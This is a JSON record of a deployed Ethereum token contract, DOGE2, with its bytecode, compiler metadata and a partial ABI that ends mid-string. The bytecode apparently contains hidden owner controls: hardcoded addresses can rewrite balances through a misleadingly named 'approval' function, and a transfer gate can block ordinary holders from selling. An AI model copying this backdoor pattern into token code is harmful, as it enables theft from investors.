{
    "address": "0xc5D1812CD71D19aF93066787a29E3521C47cAd19",
    "tx_hash": "8322e1b62a7e00a955fc1b1b7bf7b51d63c7fb514c046ee82b194a5a0fc11933",
    "block_number": 18005197,
    "timestamp": 1693129559,
    "gas_used_in_creation": 1479733,
    "creation_bytecode": "608060405260405162001b2038038062001b20833981810160405260608110156200002957600080fd5b81019080805160405193929190846401000000008211156200004a57600080fd5b838201915060208201858111156200006157600080fd5b82518660018202830111640100000000821117156200007f57600080fd5b8083526020830192505050908051906020019080838360005b83811015620000b557808201518184015260208101905062000098565b50505050905090810190601f168015620000e35780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200010757600080fd5b838201915060208201858111156200011e57600080fd5b82518660018202830111640100000000821117156200013c57600080fd5b8083526020830192505050908051906020019080838360005b838110156200017257808201518184015260208101905062000155565b50505050905090810190601f168015620001a05780820380516001836020036101000a031916815260200191505b506040526020018051906020019092919050505082600b9080519060200190620001cc929190620002eb565b5081600c9080519060200190620001e5929190620002eb565b506012600a0a8102600a8190555033600d60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600a54600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055503373ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef600a546040518082815260200191505060405180910390a35050506200039a565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200032e57805160ff19168380011785556200035f565b828001600101855582156200035f579182015b828111156200035e57825182559160200191906001019062000341565b5b5090506200036e919062000372565b5090565b6200039791905b808211156200039357600081600090555060010162000379565b5090565b90565b61177680620003aa6000396000f3fe60806040526004361061011f5760003560e01c806375247a58116100a0578063ade2de0211610064578063ade2de0214610720578063d21c8d5514610789578063dd62ed3e146107e0578063e2daf66514610865578063e8b5b796146108bc5761011f565b806375247a58146104f7578063858ced351461056a578063891e1ee0146105d357806395d89b411461062a578063a9059cbb146106ba5761011f565b8063313ce567116100e7578063313ce567146103225780633177029f1461034d578063376d567c146103c05780634a0af68d1461042957806370a08231146104925761011f565b806306fdde0314610124578063095ea7b3146101b457806311de19e71461021a57806318160ddd1461027157806323b872dd1461029c575b600080fd5b34801561013057600080fd5b50610139610925565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561017957808201518184015260208101905061015e565b50505050905090810190601f1680156101a65780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610200600480360360408110156101ca57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506109c3565b604051808215151515815260200191505060405180910390f35b34801561022657600080fd5b5061022f610ab5565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561027d57600080fd5b50610286610adb565b6040518082815260200191505060405180910390f35b610308600480360360608110156102b257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610ae1565b604051808215151515815260200191505060405180910390f35b34801561032e57600080fd5b50610337610df4565b6040518082815260200191505060405180910390f35b34801561035957600080fd5b506103a66004803603604081101561037057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610df9565b604051808215151515815260200191505060405180910390f35b3480156103cc57600080fd5b5061040f600480360360208110156103e357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610f54565b604051808215151515815260200191505060405180910390f35b34801561043557600080fd5b506104786004803603602081101561044c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610ff6565b604051808215151515815260200191505060405180910390f35b34801561049e57600080fd5b506104e1600480360360208110156104b557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611098565b6040518082815260200191505060405180910390f35b34801561050357600080fd5b506105506004803603604081101561051a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506110b0565b604051808215151515815260200191505060405180910390f35b34801561057657600080fd5b506105b96004803603602081101561058d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506111c1565b604051808215151515815260200191505060405180910390f35b3480156105df57600080fd5b506105e8611263565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561063657600080fd5b5061063f611289565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561067f578082015181840152602081019050610664565b50505050905090810190601f1680156106ac5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610706600480360360408110156106d057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611327565b604051808215151515815260200191505060405180910390f35b34801561072c57600080fd5b5061076f6004803603602081101561074357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061133c565b604051808215151515815260200191505060405180910390f35b34801561079557600080fd5b5061079e6113d0565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156107ec57600080fd5b5061084f6004803603604081101561080357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506113f6565b6040518082815260200191505060405180910390f35b34801561087157600080fd5b5061087a61141b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156108c857600080fd5b5061090b600480360360208110156108df57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611441565b604051808215151515815260200191505060405180910390f35b600b8054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156109bb5780601f10610990576101008083540402835291602001916109bb565b820191906000526020600020905b81548152906001019060200180831161099e57829003601f168201915b505050505081565b600081600760003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a36001905092915050565b600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600a5481565b600080821415610af45760019050610ded565b8373ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610c3b5781600760008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015610bb057600080fd5b81600760008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b610c468484846114e7565b610c4f57600080fd5b81600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015610c9b57600080fd5b81600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555081600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055506000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600081548092919060010191905055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190505b9392505050565b601281565b6000600d60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480610e965750731f490e99657cd08a058c6bb6cd81dd38f59e0e7a73ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b610e9f57600080fd5b6000821115610ef3576012600a0a8202600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b60018060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055506001905092915050565b6000600e60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610fb057600080fd5b81600960006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550919050565b6000600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461105257600080fd5b81600f60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550919050565b60066020528060005260406000206000915090505481565b6000600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461110c57600080fd5b6000821115611160576012600a0a8202600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b60018060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055506001905092915050565b6000600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461121d57600080fd5b81600e60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550919050565b600e60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600c8054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561131f5780601f106112f45761010080835404028352916020019161131f565b820191906000526020600020905b81548152906001019060200180831161130257829003601f168201915b505050505081565b6000611334338484610ae1565b905092915050565b60007378322d0c5768c9ca370ddfc1d44db0fef3a6e05173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461138a57600080fd5b81600860006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550919050565b600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6007602052816000526040600020602052806000526040600020600091509150505481565b600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600d60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461149d57600080fd5b81600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060019050919050565b6000600d60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614806115925750600d60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16145b806115ea5750600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16145b8061163e5750600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b1561164c5760019050611664565b611656848361166b565b61165f57600080fd5b600190505b9392505050565b60008060045414801561168057506000600254145b801561168e57506000600354145b1561169c576000905061173b565b600060045411156116f8576004546000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054106116f7576000905061173b565b5b6000600254111561171757816002541115611716576000905061173b565b5b6000600354111561173657600354821115611735576000905061173b565b5b600190505b9291505056fea265627a7a72315820a19bd9a8132388360dfdfc1e4c3a05de18d5ed38dbcc899bf3a10ae613c2613b64736f6c63430005110032000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000000005444f4745320000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005444f474532000000000000000000000000000000000000000000000000000000",
    "runtime_bytecode": "60806040526004361061011f5760003560e01c806375247a58116100a0578063ade2de0211610064578063ade2de0214610720578063d21c8d5514610789578063dd62ed3e146107e0578063e2daf66514610865578063e8b5b796146108bc5761011f565b806375247a58146104f7578063858ced351461056a578063891e1ee0146105d357806395d89b411461062a578063a9059cbb146106ba5761011f565b8063313ce567116100e7578063313ce567146103225780633177029f1461034d578063376d567c146103c05780634a0af68d1461042957806370a08231146104925761011f565b806306fdde0314610124578063095ea7b3146101b457806311de19e71461021a57806318160ddd1461027157806323b872dd1461029c575b600080fd5b34801561013057600080fd5b50610139610925565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561017957808201518184015260208101905061015e565b50505050905090810190601f1680156101a65780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610200600480360360408110156101ca57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506109c3565b604051808215151515815260200191505060405180910390f35b34801561022657600080fd5b5061022f610ab5565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561027d57600080fd5b50610286610adb565b6040518082815260200191505060405180910390f35b610308600480360360608110156102b257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610ae1565b604051808215151515815260200191505060405180910390f35b34801561032e57600080fd5b50610337610df4565b6040518082815260200191505060405180910390f35b34801561035957600080fd5b506103a66004803603604081101561037057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610df9565b604051808215151515815260200191505060405180910390f35b3480156103cc57600080fd5b5061040f600480360360208110156103e357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610f54565b604051808215151515815260200191505060405180910390f35b34801561043557600080fd5b506104786004803603602081101561044c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610ff6565b604051808215151515815260200191505060405180910390f35b34801561049e57600080fd5b506104e1600480360360208110156104b557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611098565b6040518082815260200191505060405180910390f35b34801561050357600080fd5b506105506004803603604081101561051a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506110b0565b604051808215151515815260200191505060405180910390f35b34801561057657600080fd5b506105b96004803603602081101561058d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506111c1565b604051808215151515815260200191505060405180910390f35b3480156105df57600080fd5b506105e8611263565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561063657600080fd5b5061063f611289565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561067f578082015181840152602081019050610664565b50505050905090810190601f1680156106ac5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610706600480360360408110156106d057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611327565b604051808215151515815260200191505060405180910390f35b34801561072c57600080fd5b5061076f6004803603602081101561074357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061133c565b604051808215151515815260200191505060405180910390f35b34801561079557600080fd5b5061079e6113d0565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156107ec57600080fd5b5061084f6004803603604081101561080357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506113f6565b6040518082815260200191505060405180910390f35b34801561087157600080fd5b5061087a61141b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156108c857600080fd5b5061090b600480360360208110156108df57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611441565b604051808215151515815260200191505060405180910390f35b600b8054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156109bb5780601f10610990576101008083540402835291602001916109bb565b820191906000526020600020905b81548152906001019060200180831161099e57829003601f168201915b505050505081565b600081600760003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a36001905092915050565b600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600a5481565b600080821415610af45760019050610ded565b8373ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610c3b5781600760008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015610bb057600080fd5b81600760008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b610c468484846114e7565b610c4f57600080fd5b81600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015610c9b57600080fd5b81600660008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555081600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055506000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600081548092919060010191905055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190505b9392505050565b601281565b6000600d60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480610e965750731f490e99657cd08a058c6bb6cd81dd38f59e0e7a73ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b610e9f57600080fd5b6000821115610ef3576012600a0a8202600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b60018060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055506001905092915050565b6000600e60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610fb057600080fd5b81600960006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550919050565b6000600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461105257600080fd5b81600f60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550919050565b60066020528060005260406000206000915090505481565b6000600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461110c57600080fd5b6000821115611160576012600a0a8202600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b60018060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055506001905092915050565b6000600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461121d57600080fd5b81600e60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550919050565b600e60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600c8054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561131f5780601f106112f45761010080835404028352916020019161131f565b820191906000526020600020905b81548152906001019060200180831161130257829003601f168201915b505050505081565b6000611334338484610ae1565b905092915050565b60007378322d0c5768c9ca370ddfc1d44db0fef3a6e05173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461138a57600080fd5b81600860006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550919050565b600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6007602052816000526040600020602052806000526040600020600091509150505481565b600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600d60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461149d57600080fd5b81600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060019050919050565b6000600d60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614806115925750600d60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16145b806115ea5750600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16145b8061163e5750600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b1561164c5760019050611664565b611656848361166b565b61165f57600080fd5b600190505b9392505050565b60008060045414801561168057506000600254145b801561168e57506000600354145b1561169c576000905061173b565b600060045411156116f8576004546000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054106116f7576000905061173b565b5b6000600254111561171757816002541115611716576000905061173b565b5b6000600354111561173657600354821115611735576000905061173b565b5b600190505b9291505056fea265627a7a72315820a19bd9a8132388360dfdfc1e4c3a05de18d5ed38dbcc899bf3a10ae613c2613b64736f6c63430005110032",
    "contract_name": "DOGE2",
    "compiler_version": "v0.5.17+commit.d19bba13",
    "optimization_used": "0",
    "runs": "200",
    "abi": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"_adm\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_mod\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_usdtPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_user\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approval\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approveAndCall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"Adm_\",\"type\":\"address\"}],\"name\":\"setAdm\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"Mod_\",\"type\":\"address\"}],\"name\":\"setMod\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"Pair_\",\"type\":\"address\"}],\"name\":\"setUsdtPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"User_\",\"type\":\"address\"}],\"name\":\"setUser\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\